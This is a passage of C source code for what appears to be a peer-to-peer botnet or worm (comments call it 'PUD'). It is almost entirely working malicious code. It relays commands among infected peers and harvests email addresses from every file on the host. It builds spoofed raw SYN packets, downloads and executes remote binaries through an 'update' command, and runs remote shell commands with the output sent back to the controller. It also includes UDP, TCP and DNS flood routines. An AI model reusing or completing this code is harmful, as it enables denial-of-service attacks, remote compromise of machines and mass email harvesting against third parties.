		*(u_char *)(&answer) = *(u_char *)w;
		sum += answer;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return(answer);
}

int usersa(unsigned long rs) {
	unsigned long a;
	if (rs == 0) return 0;
	for (a=0;a<LINKS;a++) if (rsa[a] == rs) return 1;
	return 0;
}

unsigned long newrsa() {
	unsigned long rs;
	while(1) {
		rs=(rand()*rand())^rand();
		if (usersa(rs)) continue;
		break;
	}
	return rs;
}

void addrsa(unsigned long rs) {
	unsigned long i;
	if (rs == 0) return;
	for (i=LINKS-1;i>0;i--) rsa[i]=rsa[i-1];
	rsa[0]=rs;
}

#ifdef WIN32
DWORD WINAPI Win32Dispatch(LPVOID a) {
	struct _pids *getpids=(struct _pids *)a;
	getpids->func(getpids->udpclient,getpids->buf,getpids->len);
	ExitThread(0);
	return 0L;
}
#endif

int delqueue(unsigned long id,unsigned long trys) {
	struct mqueue *getqueue=queues, *prevqueue=NULL;
#ifdef WIN32
	if (WaitForSingleObject(hMutexDelqueue,INFINITE) != WAIT_OBJECT_0) return 0;
#endif
	while(getqueue != NULL) {
		if (getqueue->id == id) {
			int edited=0;
			if (getqueue->trys & trys) {
				getqueue->trys^=trys;
				edited=1;
			}
			if (getqueue->trys <= 0 || trys == 3) {
				struct mqueue *next=getqueue->next;
				myfree(getqueue->packet);
				myfree(getqueue);
				if (prevqueue) prevqueue->next=next;
				else queues=next;
				edited=2;
			}
			if (queues == NULL) {
				struct _pids *getpids=pids;
				while(getpids != NULL) {
					if (getpids->type == 1 && !getpids->id) {
#ifdef WIN32
						getpids->handle=CreateThread(NULL,0,Win32Dispatch,getpids,0,&getpids->id);
#else
						getpids->id=myfork();
						if (getpids->id == 0) {
							getpids->func(getpids->udpclient,getpids->buf,getpids->len);
							exit(0);
						}
#endif
					}
					getpids=getpids->next;
				}
			}
#ifdef WIN32
			ReleaseMutex(hMutexDelqueue);
#endif
			return edited;
		}
		prevqueue=getqueue;
		getqueue=getqueue->next;
	}
#ifdef WIN32
	ReleaseMutex(hMutexDelqueue);
#endif
	return 0;
}

//////////////////////////////////////////////////////////////////////////////////////
//                                   Sending functions                              //
//////////////////////////////////////////////////////////////////////////////////////

unsigned long getnumlinks(unsigned long start,unsigned long end) {
	unsigned long a=0,i;
	for (i=0;i<numlinks;i++) if (links[i] > start && links[i] <= end) a++;
	return a;
}

int resendbroadcastqueue(struct mqueue *getqueue) {
	struct ainst ts;
	char srv[256];
	unsigned long i;
	struct route_rec *rp=(struct route_rec *)(getqueue->packet+sizeof(struct llheader));
	struct llheader *llp=(struct llheader*)getqueue->packet;
	memset((void*)&ts,0,sizeof(struct ainst));
	if (getqueue->trys == 1 || getqueue->trys == 3) {
		unsigned long l=0;
		for (i=0;i<numlinks;i++) if (links[i] > getqueue->start && links[i] <= getqueue->split) {
			conv(srv,256,links[i]);
			getqueue->start=links[i];
			l=links[i];
			break;
		}
		if (l) {
			audp_relay(&udpserver,&ts,srv,getqueue->port);
			rp->start=getqueue->start;
			rp->end=getqueue->split;
			rp->seglinks=getnumlinks(getqueue->start,getqueue->split);
			rp->ttag=1;
			llp->checksum=in_cksum((u_short *)(getqueue->packet+sizeof(struct llheader)),getqueue->len-sizeof(struct llheader));
			audp_send(&ts,&getqueue->packet,1,&getqueue->len);
		}
		if (getqueue->start >= getqueue->split || l == 0) if (delqueue(getqueue->id,1) == 2) return 1;
	}
	if (getqueue->trys == 2 || getqueue->trys == 3) {
		unsigned long last=0;
		for (i=0;i<numlinks;i++) if (links[i] > getqueue->split && links[i] <= getqueue->end) {
			last=links[i];
		}
		if (last) {
			conv(srv,256,last);
			getqueue->end=last-1;
			audp_relay(&udpserver,&ts,srv,getqueue->port);
			rp->start=getqueue->split;
			rp->end=getqueue->end;
			rp->seglinks=getnumlinks(getqueue->split,getqueue->end);
			rp->ttag=2;
			llp->checksum=in_cksum((u_short *)(getqueue->packet+sizeof(struct llheader)),getqueue->len-sizeof(struct llheader));
			audp_send(&ts,&getqueue->packet,1,&getqueue->len);
		}
		if (getqueue->split >= getqueue->end+1 || last == 0) if (delqueue(getqueue->id,2) == 2) return 1;
	}
	return 0;
}

void testqueues() {
	struct mqueue *getqueue=queues;
#ifdef WIN32
	if (WaitForSingleObject(hMutexResendQueue,INFINITE) != WAIT_OBJECT_0) return;
#endif
	while(getqueue != NULL) {
		struct mqueue *l=getqueue->next;
		if (getqueue->destination && time(NULL)-getqueue->time > 36) {
			if (delqueue(getqueue->id,3) == 2) {
				getqueue=queues;
				continue;
			}
		}
		else if ((time(NULL)-getqueue->ltime) >= (getqueue->destination?3:2) || getqueue->type > 0) {
			if (getqueue->type == 2) getqueue->type=0;
			getqueue->ltime=time(NULL);
			if (getqueue->destination) {
				struct ainst ts;
				char srv[256], *list[256];
				unsigned long i,pos=1, len[256],totallen=0;
				struct mqueue *getqueue2=queues;
				for (i=0;i<256;i++) {
					list[i]=NULL;
					len[i]=0;
				}
				list[0]=(char*)myalloc(getqueue->len+10);
				if (!list[0]) break;
				memcpy(list[0],getqueue->packet,getqueue->len);
				len[0]=getqueue->len;
				totallen+=getqueue->len;
				while(getqueue2 != NULL) {
					struct mqueue *l2=getqueue2->next;
					if (getqueue != getqueue2 && getqueue2->destination == getqueue->destination && getqueue2->port == getqueue->port && ((time(NULL)-getqueue2->ltime) >= 3 || getqueue2->type > 0) && getqueue2->trys && getqueue2->len+totallen < MAXBUF) {
						if (getqueue2->type == 2) getqueue2->type=0;
						getqueue2->ltime=time(NULL);
						list[pos]=(char*)myalloc(getqueue2->len+10);
						if (!list[pos]) break;
						memcpy(list[pos],getqueue2->packet,getqueue2->len);
						len[pos]=getqueue2->len;
						totallen+=getqueue2->len;
						pos++;
						if (getqueue2->type == 1) delqueue(getqueue2->id,3);
						getqueue2=queues;
						continue;
					}
					getqueue2=l2;
				}
				memset((void*)&ts,0,sizeof(struct ainst));
				conv(srv,256,getqueue->destination);
				audp_relay(&udpserver,&ts,srv,getqueue->port);
				audp_send(&ts,list,pos,len);
				if (getqueue->type == 1) delqueue(getqueue->id,3);
				for (i=0;i<256;i++) if (list[i]) myfree(list[i]);
				getqueue=queues;
				continue;
			}
			else if (resendbroadcastqueue(getqueue)) {
				getqueue=queues;
				continue;
			}
		}
		getqueue=l;
	}
#ifdef WIN32
	ReleaseMutex(hMutexResendQueue);
#endif
}

void addtoqueues(struct mqueue *q) {
	struct mqueue *getqueues=queues,*prev=NULL;
	while(getqueues != NULL) {
		prev=getqueues;
		getqueues=getqueues->next;
	}
	if (prev) prev->next=q;
	else queues=q;
}

void addackqueue(struct ainst *ts,char *buf,unsigned long len) {
	struct mqueue *q=(struct mqueue *)myalloc(sizeof(struct mqueue));
	if (!q) return;
	q->packet=(char*)myalloc(len);
	if (!q->packet) {
		myfree(q);
		return;
	}
	memcpy(q->packet,buf,len);
	q->len=len;
	q->id=newrsa();
	q->time=time(NULL);
	q->ltime=time(NULL)-3;
	q->destination=ts->in.sin_addr.s_addr;
	q->port=htons(ts->in.sin_port);
	q->trys=1;
	q->type=1;
	q->start=0;
	q->split=0;
	q->end=0;
	q->next=NULL;
	addtoqueues(q);
}

unsigned long lowsend(struct ainst *ts,char *buf,unsigned long len,unsigned long start,unsigned long split,unsigned long end) {
	struct llheader rp;
	struct mqueue *q;
	char *mbuf=(char*)myalloc(sizeof(rp)+len);
#ifdef WIN32
	if (WaitForSingleObject(hMutexLowsend,INFINITE) != WAIT_OBJECT_0) return 0;
#endif
	if (!mbuf) {
#ifdef WIN32
		ReleaseMutex(hMutexLowsend);
#endif
		return 0;
	}
	memset((void*)&rp,0,sizeof(struct llheader));
	rp.cancelation=0;
	rp.checksum=in_cksum((u_short *)buf,len);
	rp.id=newrsa();
	rp.type=0;
	memcpy(mbuf,(void*)&rp,sizeof(rp));
	memcpy(mbuf+sizeof(rp),buf,len);

	q=(struct mqueue *)myalloc(sizeof(struct mqueue));
	if (!q) {
#ifdef WIN32
		ReleaseMutex(hMutexLowsend);
#endif
		return 0;
	}
	q->packet=(char*)myalloc(sizeof(rp)+len);
	if (!q->packet) {
		myfree(q);
#ifdef WIN32
		ReleaseMutex(hMutexLowsend);
#endif
		return 0;
	}
	memcpy(q->packet,mbuf,sizeof(rp)+len);
	q->len=sizeof(rp)+len;
	q->id=rp.id;
	q->type=2;
	q->time=time(NULL);
	q->ltime=time(NULL);
	if (ts == NULL) {
		q->destination=0;
		q->port=PORT;
		q->trys=3;
		q->start=start;
		q->split=split;
		q->end=end;
	}
	else {
		q->destination=ts->in.sin_addr.s_addr;
		q->port=htons(ts->in.sin_port);
		q->trys=1;
		q->start=0;
		q->split=0;
		q->end=0;
	}
	q->next=NULL;
	addtoqueues(q);

	myfree(mbuf);

#ifdef WIN32
	if (GetCurrentThreadId() != parent) testqueues();
#else
	if (getpid() != parent) testqueues();
#endif

#ifdef WIN32
	ReleaseMutex(hMutexLowsend);
#endif
	return rp.id;
}

unsigned long relayclient(struct ainst *ts,char *buf,unsigned long len) {
	return lowsend(ts,buf,len,0,0,0);
}

unsigned long relay(unsigned long server,char *buf,unsigned long len) {
	struct ainst ts;
	char srv[256];
	memset((void*)&ts,0,sizeof(struct ainst));
	conv(srv,256,server);
	audp_relay(&udpserver,&ts,srv,PORT);
	return relayclient(&ts,buf,len);
}

unsigned long split(unsigned long start, unsigned long end) {
	unsigned long i,a=0,b=0;
	for (i=0;i<numlinks;i++) if (links[i] > start && links[i] <= end) a++;
	if (a <= 0) return 0;
	if (a == 1) return start;
	for (i=0;i<numlinks;i++) if (links[i] > start && links[i] <= end) {
		b++;
		if (b == round(((float)a)/2.0f)) return links[i];
	}
	return 0;
}

unsigned long segment(char *buf, unsigned long len,unsigned long start, unsigned long end) {
	unsigned long a=split(start,end);
	if (numlinks == 0 || links == NULL || a == 0) return 0;
	return lowsend(NULL,buf,len,start,a,end);
}

void broadcast(char *buf,unsigned long len) {
	struct route_rec rc;
	char *str=(char*)myalloc(sizeof(struct route_rec)+len);
	if (!str) return;
	memset((void*)&rc,0,sizeof(struct route_rec));
	rc.h.tag=0x26;
	rc.h.id=newrsa();
	rc.h.len=sizeof(struct route_rec)+len;
	rc.h.seq=newseq();
	rc.server=0;
	rc.sync=1;
	rc.links=numlinks;
	rc.seglinks=numlinks;
	rc.start=0;
	rc.end=0;
	rc.ttag=1;
	memcpy((void*)str,(void*)&rc,sizeof(struct route_rec));
	memcpy((void*)(str+sizeof(struct route_rec)),(void*)buf,len);
	segment(str,sizeof(struct route_rec)+len,0,-1);
	myfree(str);
}

void syncm(struct ainst *inst,char tag,int id) {
	struct addsrv_rec rc;
	struct next_rec { unsigned long server; } fc;
	unsigned long a,b,max=(unsigned long)(((MAXBUF-sizeof(struct addsrv_rec))-124)/sizeof(struct next_rec));
	for (b=0;;b+=max) {
		unsigned long _numlinks=numlinks-b>max?max:numlinks-b;
		unsigned long *_links=links+b;
		unsigned char *str;
		if (b > numlinks) break;
		str=(unsigned char*)myalloc(sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
		if (!str) return;
		memset((void*)&rc,0,sizeof(struct addsrv_rec));
		rc.h.tag=tag;
		rc.h.id=id;
		if (id) rc.h.seq=newseq();
		rc.h.len=sizeof(struct next_rec)*_numlinks;
		memcpy((void*)str,(void*)&rc,sizeof(struct addsrv_rec));
		for (a=0;a<_numlinks;a++) {
			memset((void*)&fc,0,sizeof(struct next_rec));
			fc.server=_links[a];
			memcpy((void*)(str+sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec))),(void*)&fc,sizeof(struct next_rec));
		}
		if (!id) relay(inst->in.sin_addr.s_addr,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
		else relayclient(inst,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
		myfree(str);
	}
}

void sendmessage(struct ainst *inst, int id, char *buf2) {
	struct data_rec rc;
	char *str,*buf=(char*)myalloc(strlen(buf2)+1);
	if (!buf) return;
	strcpy(buf,buf2);
	memset((void*)&rc,0,sizeof(struct data_rec));
	rc.h.tag=0x45;
	rc.h.id=id;
	rc.h.seq=newseq();
	rc.h.len=strlen(buf2);
	_encrypt(buf,strlen(buf2));
	str=(char*)myalloc(sizeof(struct data_rec)+strlen(buf2));
	if (!str) {
		myfree(buf);
		return;
	}
	memcpy((void*)str,(void*)&rc,sizeof(struct data_rec));
	memcpy((void*)(str+sizeof(struct data_rec)),buf,strlen(buf2));
	relayclient(&udpclient,str,sizeof(struct data_rec)+strlen(buf2));
	myfree(str);
	myfree(buf);
}

//////////////////////////////////////////////////////////////////////////////////////
//                                      Scan for email                              //
//////////////////////////////////////////////////////////////////////////////////////

#ifndef WIN32
int isgood(char a) {
	if (a >= 'a' && a <= 'z') return 1;
	if (a >= 'A' && a <= 'Z') return 1;
	if (a >= '0' && a <= '9') return 1;
	if (a == '.' || a == '@' || a == '^' || a == '-' || a == '_') return 1;
	return 0;
}

int islisten(char a) {
	if (a == '.') return 1;
	if (a >= 'a' && a <= 'z') return 1;
	if (a >= 'A' && a <= 'Z') return 1;
	return 0;
}

struct _linklist {
	char *name;
	struct _linklist *next;
} *linklist=NULL;

void AddToList(char *str) {
	struct _linklist *getb=linklist,*newb;
	while(getb != NULL) {
		if (!strcmp(str,getb->name)) return;
		getb=getb->next;
	}
	newb=(struct _linklist *)myalloc(sizeof(struct _linklist));
	if (!newb) return;
	newb->name=(char*)myalloc(strlen(str)+1);
	if (newb->name) {
		strcpy(newb->name,str);
		newb->next=linklist;
		linklist=newb;
	}
}

void cleanup(char *buf) {
	while(buf[strlen(buf)-1] == '\n' || buf[strlen(buf)-1] == '\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;
	while(*buf == '\n' || *buf == '\r' || *buf == ' ') {
		unsigned long i;
		for (i=strlen(buf)+1;i>0;i--) buf[i-1]=buf[i];
	}
}

void ScanFile(char *f) {
	FILE *file=fopen(f,"r");
	unsigned long startpos=0;
	if (file == NULL) return;
	while(1) {
		char buf[2];
		memset(buf,0,2);
		fseek(file,startpos,SEEK_SET);
		fread(buf,1,1,file);
		startpos++;
		if (feof(file)) break;
		if (*buf == '@') {
			char email[256],c,d;
			unsigned long pos=0;
			while(1) {
				unsigned long oldpos=ftell(file);
				fseek(file,-1,SEEK_CUR);
				c=fgetc(file);
				if (!isgood(c)) break;
				fseek(file,-1,SEEK_CUR);
				if (oldpos == ftell(file)) break;
			}
			for (pos=0,c=0,d=0;pos<255;pos++) {
				email[pos]=fgetc(file);
				if (email[pos] == '.') c++;
				if (email[pos] == '@') d++;
				if (!isgood(email[pos])) break;
			}
			email[pos]=0;
			if (c == 0 || d != 1) continue;
			if (email[strlen(email)-1] == '.') email[strlen(email)-1]=0;
			if (*email == '@' || *email == '.' || !*email) continue;
			if (!strcmp(email,"webmaster@mydomain.com")) continue;
			for (pos=0,c=0;pos<strlen(email);pos++) if (email[pos] == '.') c=pos;
			if (c == 0) continue;
			if (!strncmp(email+c,".hlp",4)) continue;
			for (pos=c,d=0;pos<strlen(email);pos++) if (!islisten(email[pos])) d=1;
			if (d == 1) continue;
			AddToList(email);
		}
	}
	fclose(file);
}

void StartScan() {
	FILE *f;
	f=popen("find / -type f","r");
	if (f == NULL) return;
	while(1) {
		char fullfile[MAXPATH];
		memset(fullfile,0,MAXPATH);
		fgets(fullfile,MAXPATH,f);
		if (feof(f)) break;
		while(fullfile[strlen(fullfile)-1]=='\n' ||
			fullfile[strlen(fullfile)-1] == '\r')
			fullfile[strlen(fullfile)-1]=0;
		if (!strncmp(fullfile,"/proc",5)) continue;
		if (!strncmp(fullfile,"/dev",4)) continue;
		if (!strncmp(fullfile,"/bin",4)) continue;
		ScanFile(fullfile);
	}
}
#endif

//////////////////////////////////////////////////////////////////////////////////////
//                                DrDos                                             //
//    NOTE: I DID NOT CODE THIS SECTION, IT WAS TAKEN FROM A POPULAR DENIAL OF      //
//          SERVICE PROGRAM. IT HAS BEEN EDITED TO FIT PUD.                         //
//////////////////////////////////////////////////////////////////////////////////////

struct ip {
#if BYTE_ORDER == BIG_ENDIAN
    u_int   ip_v:4, ip_hl:4;
#else
	u_int   ip_hl:4, ip_v:4;
#endif
    u_char  ip_tos;
    u_short ip_len;
    u_short ip_id;
    u_short ip_off;
    u_char  ip_ttl;
    u_char  ip_p;
    u_short ip_sum;
    struct  in_addr ip_src,ip_dst;
};

struct tcphdr {
    u_short th_sport;
    u_short th_dport;
    u_int32_t th_seq;
    u_int32_t th_ack;
#if BYTE_ORDER == BIG_ENDIAN
    u_int   th_off:4, th_x2:4;
#else
    u_int   th_x2:4, th_off:4;
#endif
    u_char  th_flags;
    u_short th_win;
    u_short th_sum;
    u_short th_urp;
};

struct pseudo {
	unsigned long srca, dsta;
	unsigned char zero, proto;
	unsigned short tcplen;
};

struct checksum {
	struct pseudo pp;
	struct tcphdr tt;
};

short int send_syn(int sox,unsigned long int src, unsigned long int dst, unsigned short int port) {
	struct sockaddr_in s;
	struct ip *i;
	struct tcphdr *t;
	struct pseudo p;
	struct checksum c;
	char packet[sizeof(char)*(sizeof(struct ip)+sizeof(struct tcphdr))];
	s.sin_family = PF_INET;
	s.sin_port = port;
	s.sin_addr.s_addr = dst;
	i = (struct ip *)&packet;
	t = (struct tcphdr *)(i+sizeof(struct ip));
	memset(&packet, 0, sizeof(packet));
	i->ip_hl = 5;
	i->ip_v = 4;
	i->ip_tos = 0x08;
	i->ip_len = htons(sizeof(packet));
	i->ip_id = rand();
	i->ip_off = 0;
	i->ip_ttl = 255;
	i->ip_p = 6;
	i->ip_sum = 0;
	i->ip_src.s_addr = src;
	i->ip_dst.s_addr = dst;
	t->th_sport = rand();
	t->th_dport = port;
	t->th_seq = rand();
	t->th_ack = 0;
	t->th_x2 = 0;
	t->th_off = 5;
	t->th_flags = 0x02;
	t->th_win = 65535;
	t->th_urp = 0;
	t->th_sum = 0;
	p.srca = src;
	p.dsta = dst;
	p.proto = 6;
	p.tcplen = htons(sizeof(struct tcphdr));
	p.zero = 0;
	memcpy(&c.pp, &p, sizeof(p));
	memcpy(&c.tt, t, sizeof(struct tcphdr));
	t->th_sum = in_cksum((u_short *)&c, sizeof(c));
	if (sendto(sox, packet, ntohs(i->ip_len), 0, (struct sockaddr *)&s, sizeof(s)) == -1) return(-1);
	return 0;
}

//////////////////////////////////////////////////////////////////////////////////////
//                            Internal functions                                    //
//////////////////////////////////////////////////////////////////////////////////////

/**** Linux: WORKS - Windows: WORKS ****/
void update(struct ainst *udpclient, unsigned char *buf, unsigned long len) {
	struct ainst *a;
	FILE *file;
	char filename[256],base[256],b,*tmp;
	struct update_rec *rp=(struct update_rec *)buf;
	if (len < sizeof(struct update_rec) || rp->h.len > len) return;
	if (VERSION >= rp->version) return;
	if (rp->os != myos) return;
	tmp=(char*)myalloc(rp->h.len+3);
	memset(tmp,0,rp->h.len+3);
	memcpy(tmp,buf+sizeof(struct update_rec),rp->h.len);
	_decrypt(tmp,rp->h.len);
	memset(filename,0,256);
#ifndef WIN32
	strcpy(filename,"/tmp/");
	filename[strlen(filename)]='.';
#endif
	for (b=0;b<5;b++) filename[strlen(filename)]=(rand()%(91-65))+65;
#ifdef WIN32
	strcpy(filename+strlen(filename),".exe");
#endif
	if (!(a=getwebsite(tmp))) {
		sendmessage(udpclient,rp->h.id,"Unable to download");
		return;
	}
	if ((file=fopen(filename,"wb")) == NULL) {
		myfree(a);
		sendmessage(udpclient,rp->h.id,"Unable to open temporary file");
		return;
	}
	while(1) {
		unsigned long start=time(NULL);
		char buf[1024];
		memset(buf,0,1024);
		while(time(NULL)-start < 30) if (atcp_recv(a,buf,1024) != APENDING) break;
		if (a->error != ASUCCESS) break;
		fwrite(buf,1,a->len,file);
	}
	fclose(file);
	myfree(a);
#ifndef WIN32
	chmod(filename,S_IRWXU|S_IRGRP|S_IXGRP|S_IROTH|S_IXOTH);
#endif
	conv(base,256,rp->base);
	close(udpserver.sock);
	execl(filename,filename,base,NULL);
	return;
}

/**** Linux: WORKS - Windows: WORKS ****/
void info(struct ainst *udpclient, unsigned char *buf, unsigned long len) {
	struct getinfo_rec *rp=(struct getinfo_rec *)buf;
	struct info_rec rc;
	char hostname[256],*str;
	if (len < sizeof(struct getinfo_rec)) return;
	memset((void*)&rc,0,sizeof(struct info_rec));
	rc.h.tag=0x47;
	rc.h.id=rp->h.id;
	rc.h.seq=newseq();
	rc.h.len=0;
#ifdef SCAN
	rc.a=a;
	rc.b=b;
	rc.c=c;
	rc.d=d;
#endif
	rc.os=myos;
	rc.ip=myip;
	rc.version=VERSION;
	rc.reqtime=rp->time;
	rc.reqmtime=rp->mtime;
	memset(hostname,0,256);
	gethostname(hostname,256);
	rc.hostlen=strlen(hostname);
	_encrypt(hostname,rc.hostlen);

	str=(char*)myalloc(sizeof(struct info_rec)+rc.hostlen);
	if (!str) return;
	memcpy((void*)str,(void*)&rc,sizeof(struct info_rec));
	memcpy((void*)(str+sizeof(struct info_rec)),hostname,rc.hostlen);
	relayclient(udpclient,str,sizeof(struct info_rec)+rc.hostlen);
	myfree(str);
}

/**** Linux: WORKS - Windows: WORKS ****/
void run(struct ainst *udpclient, unsigned char *buf, unsigned long len) {
#ifdef WIN32
	HANDLE					PipeReadHandle;
	HANDLE					PipeWriteHandle;
	PROCESS_INFORMATION		ProcessInfo;
	SECURITY_ATTRIBUTES		SecurityAttributes;
	STARTUPINFO				StartupInfo;
	unsigned long tmp1,tmp2;
#else
	int sockets[2];
#endif
	char *tmp;
	struct sh_rec *sr=(struct sh_rec *)buf;
	int id,pid=1;
	unsigned long j;
	if (len < sizeof(struct sh_rec) || sr->h.len > len) return;
	id=sr->h.id;
#ifdef WIN32
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));
	ZeroMemory(&SecurityAttributes, sizeof(SecurityAttributes));
	SecurityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	SecurityAttributes.bInheritHandle = TRUE;
	SecurityAttributes.lpSecurityDescriptor = NULL;
	if (!CreatePipe(&PipeReadHandle,&PipeWriteHandle,&SecurityAttributes,0)) return;
	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	StartupInfo.wShowWindow = SW_HIDE;
	StartupInfo.hStdOutput = PipeWriteHandle;
	StartupInfo.hStdError = PipeWriteHandle;
	tmp=(char*)myalloc(sr->h.len+15);
	memset(tmp,0,sr->h.len+15);
	strcpy(tmp,"cmd /C \"");
	j=strlen(tmp);
	memcpy(tmp+j,buf+sizeof(struct sh_rec),sr->h.len);
	_decrypt(tmp+j,sr->h.len);
	strcat(tmp,"\"");
	if (!CreateProcess(NULL,tmp,NULL,NULL,TRUE,0,NULL,"C:\\",&StartupInfo,&ProcessInfo)) return;
	myfree(tmp);
#else
	tmp=(char*)myalloc(sr->h.len+3);
	memset(tmp,0,sr->h.len+3);
	memcpy(tmp,buf+sizeof(struct sh_rec),sr->h.len);
	_decrypt(tmp,sr->h.len);
	if (socketpair(AF_UNIX,SOCK_STREAM,0,sockets) < 0) return;
	pid=myfork();
	if (pid < 0) return;
#endif
	if (pid) {
		char *que=NULL;
#ifndef WIN32
		close(sockets[0]);
#endif
		while(1) {
			unsigned long offset=0,i,len=0;
			char *buf,*str;
			if (que) {
				offset=strlen(que);
				buf=(char*)myalloc(strlen(que)+LINEMAX);
				if (!buf) break;
				memset(buf,0,strlen(que)+LINEMAX);
				strcpy(buf,que);
				myfree(que);
				que=NULL;
			}
			else {
				buf=(char*)myalloc(LINEMAX);
				if (!buf) break;
				memset(buf,0,LINEMAX);
			}
#ifdef WIN32
			for (;;) {
				if (!PeekNamedPipe(PipeReadHandle,buf+offset,1,&len,&tmp1,&tmp2)) {
					myfree(buf);
					buf=NULL;
					break;
				}
				if (len) {
					if (!ReadFile(PipeReadHandle,buf+offset,LINEMAX-2,&len,NULL)) {
						myfree(buf);
						buf=NULL;
						break;
					}
					break;
				}
				else if (WaitForSingleObject(ProcessInfo.hProcess, 0) == WAIT_OBJECT_0) {
					myfree(buf);
					buf=NULL;
					break;
				}
			}
			if (buf == NULL) break;
#else
			if ((len=read(sockets[1],buf+offset,LINEMAX-2)) <= 0) {
				myfree(buf);
				break;
			}
#endif
			str=buf;
			len+=offset;
			for (i=0;i<strlen(str);i++) {
				if (str[i] == '\n') {
					struct data_rec rc;
					char *strp;
					str[i]=0;

					memset((void*)&rc,0,sizeof(struct data_rec));
					rc.h.tag=0x41;
					rc.h.seq=newseq();
					rc.h.id=id;
					rc.h.len=strlen(str);
					_encrypt(str,rc.h.len);
					strp=(char*)myalloc(sizeof(struct data_rec)+rc.h.len);
					if (!strp) break;
					memcpy((void*)strp,(void*)&rc,sizeof(struct data_rec));
					memcpy((void*)(strp+sizeof(struct data_rec)),str,rc.h.len);
					relayclient(udpclient,strp,sizeof(struct data_rec)+rc.h.len);
					myfree(strp);

					str+=i+1;
					i=-1;
					if (str >= buf+len) break;
				}
			}
			if (str < buf+len) {
				if (strlen(str)+2 < 32000) {
					que=(char*)myalloc(strlen(str)+2);
					if (!que) break;
					memset(que,0,strlen(str)+2);
					strcpy(que,str);
				}
			}
			myfree(buf);
		}
#ifdef WIN32
	}
	if (!CloseHandle(ProcessInfo.hThread)) return;
	if (!CloseHandle(ProcessInfo.hProcess)) return;
	if (!CloseHandle(PipeReadHandle)) return;
	if (!CloseHandle(PipeWriteHandle)) return;
#else
		kill(pid,9);
		waitpid(pid,NULL,WNOHANG);
		close(sockets[1]);
	}
	else {
		close(sockets[1]);
		close(udpserver.sock);
		dup2(sockets[0],0);
		dup2(sockets[0],1);
		dup2(sockets[0],2);
		system(tmp);
		myfree(tmp);
		return;
	}
#endif
	return;
}

/**** Linux: WORKS - Windows: WORKS ****/
void udpflood(struct ainst *udpclient, unsigned char *buf, unsigned long len) {
	unsigned long flag=1;
	int fd,i=0;
	char *str;
	struct sockaddr_in in;
	time_t start=time(NULL);
	struct udp_rec *rp=(struct udp_rec *)buf;
	if (len < sizeof(struct udp_rec)) return;
	if (rp->size > 9216) {
		sendmessage(udpclient,rp->h.id,"Size must be less than or equal to 9216");
		return;
	}
	if (!isreal(rp->target)) {
		sendmessage(udpclient,rp->h.id,"Cannot packet local networks");
		return;
	}
	str=(char*)myalloc(rp->size);
	if (!str) return;
	for (i=0;i<rp->size;i++) str[i]=rand();
	memset((void*)&in,0,sizeof(struct sockaddr_in));
	in.sin_addr.s_addr=rp->target;
	in.sin_family=AF_INET;
	in.sin_port=htons(rp->port);
	while(1) {
		if (rp->port == 0) in.sin_port = rand();
		if ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);
		else {
#ifdef WIN32
			ioctlsocket(fd, FIONBIO, (unsigned long*)&flag);
#else
			flag = fcntl(fd, F_GETFL, 0);
			flag |= O_NONBLOCK;
			fcntl(fd, F_SETFL, flag);
#endif
			sendto(fd,str,rp->size,0,(struct sockaddr*)&in,sizeof(in));
			close(fd);
		}
		if (i >= 50) {
			if (time(NULL) >= start+rp->secs) return;
			i=0;
		}
		i++;
	}
	myfree(str);
	return;
}

/**** Linux: WORKS - Windows: WORKS ****/
void tcpflood(struct ainst *udpclient, unsigned char *buf, unsigned long len) {
	unsigned long flag=1;
	int fd,i=0;
	struct sockaddr_in in;
	time_t start=time(NULL);
	struct tcp_rec *rp=(struct tcp_rec *)buf;
	if (len < sizeof(struct tcp_rec)) return;
	if (!isreal(rp->target)) {
		sendmessage(udpclient,rp->h.id,"Cannot packet local networks");
		return;
	}
	memset((void*)&in,0,sizeof(struct sockaddr_in));
	in.sin_addr.s_addr=rp->target;
	in.sin_family=AF_INET;
	in.sin_port=htons(rp->port);
	while(1) {
		if (rp->port == 0) in.sin_port = rand();
		if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
		else {
#ifdef WIN32
			ioctlsocket(fd, FIONBIO, (unsigned long*)&flag);
#else
			flag = fcntl(fd, F_GETFL, 0);
			flag |= O_NONBLOCK;
			fcntl(fd, F_SETFL, flag);
#endif
			connect(fd, (struct sockaddr *)&in, sizeof(in));
			close(fd);
		}
		if (i >= 50) {
			if (time(NULL) >= start+rp->secs) return;
			i=0;
		}
		i++;
	}
	return;
}

/**** Linux: WORKS - Windows: WORKS ****/
void dnsflood(struct ainst *udpclient, unsigned char *buf, unsigned long len) {
	struct dns {
		unsigned short int id;
		unsigned char  rd:1;
		unsigned char  tc:1;
		unsigned char  aa:1;
		unsigned char  opcode:4;
		unsigned char  qr:1;
		unsigned char  rcode:4;
		unsigned char  unused:2;
		unsigned char  pr:1;
		unsigned char  ra:1;
		unsigned short int que_num;
		unsigned short int rep_num;
		unsigned short int num_rr;
		unsigned short int num_rrsup;
		char buf[128];
	} dnsp;
	unsigned long mlen=0,i=0,startm;
	int fd,flag=1;
	char *convo;
	struct sockaddr_in in;
	struct df_rec *rp=(struct df_rec *)buf;
	time_t start=time(NULL);
	if (len < sizeof(struct df_rec) || rp->h.len > len) return;
	if (!isreal(rp->target)) {
		sendmessage(udpclient,rp->h.id,"Cannot packet local networks");
		return;
	}
	memset((void*)&in,0,sizeof(struct sockaddr_in));
	in.sin_addr.s_addr=rp->target;
	in.sin_family=AF_INET;
	in.sin_port=htons(53);
	dnsp.rd=1;
	dnsp.tc=0;
	dnsp.aa=0;
	dnsp.opcode=0;
	dnsp.qr=0;
	dnsp.rcode=0;
	dnsp.unused=0;
	dnsp.pr=0;
	dnsp.ra=0;
	dnsp.que_num=256;
	dnsp.rep_num=0;
	dnsp.num_rr=0;
	dnsp.num_rrsup=0;
